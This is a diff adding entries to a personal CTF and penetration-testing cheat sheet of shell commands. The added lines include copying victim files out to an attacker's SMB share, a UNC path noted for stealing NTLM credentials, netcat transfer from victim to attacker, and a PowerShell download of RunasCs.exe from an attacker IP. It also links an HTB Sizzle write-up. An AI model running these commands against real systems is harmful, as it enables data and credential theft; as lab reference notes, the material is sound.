@@ -1,4 +1,29 @@
+#-------------------------------share file
+impacket-smbserver SHARE .
+copy \\attacker\SHARE\file .
+copy <victim_file> \\attacker\SHARE\file 
+//attacker/SHARE/file   #steal NTLM credentials
+
+python3 -m http.server 80
+wget <url>
+wget -r -np -N http://localhost:8000/  #download an folder
+curl <addr> -o <file_path>
+powershell -c wget 10.10.14.4/RunasCs.exe -outfile r.exe
+
+ftp
+binary
+put <file>
+
+<victim>: nc -l -p 12345 < file_to_send
+<attacker>: nc <victim_ip> 12345 > received_file
+-----------------------------------------------
+https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
+#find the place where can write or read
+find . -type d | while read directory; do touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/0xdf; done
+/dev/shm  same /tmp
+pstree
 export PATH="$PATH:$HOME/.local/bin"
+export PATH=$PATH:
 
 nl = cat
 ss -lntp   #check all connection
@@ -25,6 +50,7 @@ file ./*
 find ./ -type f -mtime -15   #sửa đổi gần đây  15 ngày qua:
 find / -iname backup.py 2>/dev/null   #find the file with name backup.py from /
 strings  <filename> | grep '\$' -B5 -A5  #find 4 line before and after the line contain '\$'
+grep -o -r "FCSC{.*}"    #find all file with content {} in current directory
 
 |jq .  #json decode
 
@@ -37,8 +63,6 @@ echo 'shengngu' | nc -l localhost 2222
 Ctrl + Z   --> bg  --> ps aux
 
 ./medium4; echo $?  #regconize the errors
-
-smbclient -L //192.168.1.5/Mydata -U testusers
 
 htop
 ps -ef --forest
